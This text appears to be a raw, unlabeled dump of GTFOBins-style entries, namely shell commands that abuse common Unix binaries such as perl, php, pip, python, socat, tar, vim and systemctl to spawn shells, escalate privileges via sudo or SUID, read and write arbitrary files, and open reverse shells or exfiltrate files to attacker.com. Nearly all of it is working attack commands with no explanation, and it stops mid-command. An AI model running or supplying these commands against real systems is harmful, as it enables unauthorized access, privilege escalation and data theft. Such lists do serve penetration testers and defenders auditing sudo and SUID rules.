sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
pdftex --shell-escape '\write18{/bin/sh}\end'
sudo pdftex --shell-escape '\write18{/bin/sh}\end'
./pdftex --shell-escape '\write18{/bin/sh}\end'
perf stat /bin/sh
./perf stat /bin/sh -p
sudo perf stat /bin/sh
LFILE=file_to_read
perl -ne print $LFILE
export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
pg /etc/profile
!/bin/sh
sudo pg /etc/profile
!/bin/sh
export CMD="/bin/sh"
php -r 'system(getenv("CMD"));'
export CMD="/bin/sh"
php -r 'passthru(getenv("CMD"));'
export CMD="/bin/sh"
php -r 'print(shell_exec(getenv("CMD")));'
export CMD="/bin/sh"
php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
export CMD="/bin/sh"
php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
export CMD="id"
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
CMD="/bin/sh"
sudo php -r "system('$CMD');"
CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
export LFILE=file_to_read
php -r 'readfile(getenv("LFILE"));'
export LFILE=file_to_write
php -r 'file_put_contents(getenv("LFILE"), "DATA");'
LFILE=file_to_read
pic $LFILE
pic -U
.PS
sh X sh X
sudo pic -U
.PS
sh X sh X
./pic -U
.PS
sh X sh X
pico
^R^X
reset; sh 1>&0 2>&0
pico -s /bin/sh
/bin/sh
^T
pico file_to_write
DATA
^O
./pico -s /bin/sh
/bin/sh
^T
sudo pico
^R^X
reset; sh 1>&0 2>&0
COMMAND=id
pidstat -e $COMMAND
COMMAND=id
sudo pidstat -e $COMMAND
COMMAND=id
./pidstat -e $COMMAND
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
pip install $TF
export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
pip install $TF
export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
pip install $TF
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
pip install $TF
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
pip install $TF
TF=$(mktemp -d)
echo 'raise Exception(open("file_to_read").read())' > $TF/setup.py
pip install $TF
TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
pip install $TF
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```
sudo pkg install -y --no-repo-update ./x-1.0.txz
LFILE=file_to_read
pr -T $LFILE
LFILE=file_to_read
pr -T $LFILE
LFILE=file_to_read
pr -T $LFILE
pry
system("/bin/sh")
sudo pry
system("/bin/sh")
./pry
system("/bin/sh")
psftp
!/bin/sh
sudo psftp
!/bin/sh
sudo psftp
!/bin/sh
psql
\?
!/bin/sh
psql
\?
!/bin/sh
LFILE=file_to_read
ptx -w 5000 "$LFILE"
LFILE=file_to_read
./ptx -w 5000 "$LFILE"
LFILE=file_to_read
sudo ptx -w 5000 "$LFILE"
puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
LFILE="/tmp/file_to_write"
puppet apply -e "file { '$LFILE': content => 'DATA' }"
LFILE=file_to_read
puppet filebucket -l diff /dev/null $LFILE
sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
export LFILE=file_to_write
pwsh -c '"DATA" | Out-File $env:LFILE'
export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
export URL=http://attacker.com/
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
export LPORT=8888
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])'
LFILE=file-to-read
rake -f $LFILE
LFILE=file_to_read
readelf -a @$LFILE
LFILE=file_to_read
./readelf -a @$LFILE
LFILE=file_to_read
sudo readelf -a @$LFILE
red file_to_write
a
DATA
.
w
q
red file_to_read
,p
q
sudo red file_to_write
a
DATA
.
w
q
LFILE=file_to_read
redcarpet "$LFILE"
LFILE=file_to_read
sudo redcarpet "$LFILE"
IP=127.0.0.1
redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x "DATA"
save
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
LFILE=file_to_read
rev $LFILE | rev
LFILE=file_to_read
./rev $LFILE | rev
LFILE=file_to_read
sudo rev $LFILE | rev
Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker system to capture the contents.
`rlogin` hangs waiting for the remote peer to close the socket.
The file is corrupted by leading and trailing spurious data.
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
LFILE=file_to_write
rlwrap -l "$LFILE" echo DATA
It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
sudo rpm -ivh x-1.0-1.noarch.rpm
echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
rtorrent
echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
./rtorrent
export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
export LPORT=8888
ruby -run -e httpd . -p $LPORT
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
run-mailcap --action=view /etc/hosts
!/bin/sh
The file must exist and be not empty.
This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.
sudo run-mailcap --action=view /etc/hosts
!/bin/sh
TF=$(mktemp)
echo '! exec /bin/sh' >$TF
runscript $TF
TF=$(mktemp)
echo '! exec /bin/sh' >$TF
./runscript $TF
TF=$(mktemp)
echo '! exec /bin/sh' >$TF
sudo runscript $TF
export RHOST=attacker.com
export RPORT=12345
rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
rview -c ':lua local s=require("socket"); local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
rview -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
export URL=http://attacker.com/
export LFILE=file_to_send
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
export LPORT=8888
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rview -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
export LPORT=12345
export LFILE=file_to_save
rview -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
rview file_to_write
iDATA
^[
w!
export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
rvim -c ':lua local s=require("socket"); local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
rvim -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
export URL=http://attacker.com/
export LFILE=file_to_send
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
export LPORT=8888
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rvim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
export LPORT=12345
export LFILE=file_to_save
rvim -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
rvim file_to_write
iDATA
^[
w
scanmem
shell /bin/sh
./scanmem
shell /bin/sh
sudo scanmem
shell /bin/sh
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
RPATH=user@attacker.com:~/file_to_save
LPATH=file_to_send
scp $LFILE $RPATH
RPATH=user@attacker.com:~/file_to_get
LFILE=file_to_save
scp $RPATH $LFILE
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
./scp -S $TF a b:
LFILE=file_to_write
screen -L -Logfile $LFILE echo DATA
LFILE=file_to_write
screen -L $LFILE echo DATA
LFILE=file_to_write
sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
LFILE=file_to_read
sed '' "$LFILE"
LFILE=file_to_read
./sed -e '' "$LFILE"
LFILE=file_to_change
USER=somebody
./setfacl -m u:$USER:rwx $LFILE
LFILE=file_to_change
USER=somebody
sudo setfacl -m -u:$USER:rwx $LFILE
TF=$(mktemp)
setlock $TF /bin/sh
HOST=user@attacker.com
sftp $HOST
!/bin/sh
RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save
RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save
HOST=user@attacker.com
sudo sftp $HOST
!/bin/sh
sg $(id -ng)
sudo sg root
LFILE=file_to_read
shuf -z "$LFILE"
LFILE=file_to_write
shuf -e DATA -o "$LFILE"
LFILE=file_to_write
./shuf -e DATA -o "$LFILE"
LFILE=file_to_write
sudo shuf -e DATA -o "$LFILE"
smbclient '\\attacker\share'
!/bin/sh
smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
sudo smbclient '\\attacker\share'
!/bin/sh
It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
socat stdin exec:/bin/sh
RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
LFILE=file_to_read
socat -u "file:$LFILE" -
LFILE=file_to_write
socat -u 'exec:echo DATA' "open:$LFILE,creat"
sudo socat stdin exec:/bin/sh
RHOST=attacker.com
RPORT=12345
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
RHOST=attacker.com
RPORT=12345
socket -qvp '/bin/sh -i' $RHOST $RPORT
LPORT=12345
socket -svp '/bin/sh -i' $LPORT
LFILE=file_to_read
soelim "$LFILE"
LFILE=file_to_read
./soelim "$LFILE"
LFILE=file_to_read
sudo soelim "$LFILE"
LFILE=file_to_read
sort -m "$LFILE"
LFILE=file_to_read
./sort -m "$LFILE"
LFILE=file_to_read
sudo sort -m "$LFILE"
LFILE=file_to_read
TF=$(mktemp)
split $LFILE $TF
cat $TF*
TF=$(mktemp)
echo DATA >$TF
split -b999m $TF
EXT=.xxx
TF=$(mktemp)
echo DATA >$TF
split -b999m --additional-suffix $EXTENSION $TF
COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF
COMMAND=id
echo | split --filter=$COMMAND /dev/stdin
split --filter=/bin/sh /dev/stdin
sudo split --filter=/bin/sh /dev/stdin
LFILE=file_to_write
sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
LFILE=file_to_read
ss -a -F $LFILE
LFILE=file_to_read
./ss -a -F $LFILE
LFILE=file_to_read
sudo ss -a -F $LFILE
LFILE=file_to_read
ssh-keyscan -f $LFILE
LFILE=file_to_read
./ssh-keyscan -f $LFILE
LFILE=file_to_read
sudo ssh-keyscan -f $LFILE
HOST=user@attacker.com
RPATH=file_to_save
LPATH=file_to_send
ssh $HOST "cat > $RPATH" < $LPATH
HOST=user@attacker.com
RPATH=file_to_get
LPATH=file_to_save
ssh $HOST "cat $RPATH" > $LPATH
LFILE=file_to_read
ssh -F $LFILE localhost
LFILE=file_to_write
strace -s 999 -o $LFILE strace - DATA
LFILE=file_to_read
strings "$LFILE"
LFILE=file_to_read
./strings "$LFILE"
LFILE=file_to_read
sudo strings "$LFILE"
COMMAND='/bin/sh -c id>/tmp/id'
sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
LFILE=file_to_read
/usr/sbin/sysctl -n "/../../$LFILE"
COMMAND='/bin/sh -c id>/tmp/id'
./sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
COMMAND='/bin/sh -c id>/tmp/id'
sudo sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
sudo systemctl
!sh
sudo systemd-resolve --status
!sh
LFILE=file_to_read
tac -s 'RANDOM' "$LFILE"
LFILE=file_to_read
./tac -s 'RANDOM' "$LFILE"
LFILE=file_to_read
sudo tac -s 'RANDOM' "$LFILE"
LFILE=file_to_read
tail -c1G "$LFILE"
LFILE=file_to_read
./tail -c1G "$LFILE"
LFILE=file_to_read
sudo tail -c1G "$LFILE"
TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"
tar xf "$TF.tar" --to-command sh
rm "$TF"*
RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_get.tar
tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
LFILE=file_to_write
TF=$(mktemp)
echo DATA > "$TF"
tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
tasksh
!/bin/sh
./tasksh
!/bin/sh
sudo tasksh
!/bin/sh
LFILE=file_to_read
tbl $LFILE
LFILE=file_to_read
./tbl $LFILE
LFILE=file_to_read
sudo tbl $LFILE
tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tdbtool
! /bin/sh
sudo tdbtool
! /bin/sh
./tdbtool
! /bin/sh
LFILE=file_to_write
echo DATA | ./tee -a "$LFILE"
LFILE=file_to_write
echo DATA | ./tee -a "$LFILE"
LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh
RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
RHOST=attacker.com
RPORT=12345
sudo telnet $RHOST $RPORT
^]
!/bin/sh
RHOST=attacker.com
RPORT=12345
./telnet $RHOST $RPORT
^]
!/bin/sh
terraform console
file("file_to_read")
sudo terraform console
file("file_to_read")
./terraform console
file("file_to_read")
tex --shell-escape '\write18{/bin/sh}\end'
sudo tex --shell-escape '\write18{/bin/sh}\end'
./tex --shell-escape '\write18{/bin/sh}\end'
RHOST=attacker.com
tftp $RHOST
put file_to_send
RHOST=attacker.com
tftp $RHOST
get file_to_get
RHOST=attacker.com
./tftp $RHOST
put file_to_send
RHOST=attacker.com
sudo tftp $RHOST
put file_to_send
LFILE=file_to_read
tic -C "$LFILE"
LFILE=file_to_read
./tic -C "$LFILE"
LFILE=file_to_read
sudo tic -C "$LFILE"
timedatectl list-timezones
!/bin/sh
sudo timedatectl list-timezones
!/bin/sh
LFILE=file_to_read
tmux -f $LFILE
tmux -S /path/to/socket_name
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset
LFILE=file_to_read
troff $LFILE
LFILE=file_to_read
./troff $LFILE
LFILE=file_to_read
sudo troff $LFILE
TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
tshark -Xlua_script:$TF
LFILE=file_to_read
ul "$LFILE"
LFILE=file_to_read
./ul "$LFILE"
LFILE=file_to_read
sudo ul "$LFILE"
LFILE=file_to_read
unexpand -t99999999 "$LFILE"
LFILE=file_to_read
./unexpand -t99999999 "$LFILE"
LFILE=file_to_read
sudo unexpand -t99999999 "$LFILE"
LFILE=file_to_read
uniq "$LFILE"
LFILE=file_to_read
./uniq "$LFILE"
LFILE=file_to_read
sudo uniq "$LFILE"
sudo unsquashfs shell
./squashfs-root/sh -p
./unsquashfs shell
./squashfs-root/sh -p
sudo unzip -K shell.zip
./sh -p
./unzip -K shell.zip
./sh -p
LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
sudo update-alternatives --force --install "$LFILE" x "$TF" 0
LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
./update-alternatives --force --install "$LFILE" x "$TF" 0
LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
LFILE=file_to_read
sudo uuencode "$LFILE" /dev/stdout | uudecode
LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
LFILE=file_to_read
sudo uuencode "$LFILE" /dev/stdout | uudecode
cd $(mktemp -d)
echo 'exec "/bin/sh"' > Vagrantfile
vagrant up
cd $(mktemp -d)
echo 'exec "/bin/sh"' > Vagrantfile
vagrant up
cd $(mktemp -d)
echo 'exec "/bin/sh -p"' > Vagrantfile
vagrant up
LFILE=file_to_write
sudo varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
LFILE=file_to_write
./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
vi
:set shell=/bin/sh
:shell
vi file_to_write
iDATA
^[
w
view
:set shell=/bin/sh
:shell
export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require("socket"); local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
view -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
view file_to_write
iDATA
^[
w!
export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
vim -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
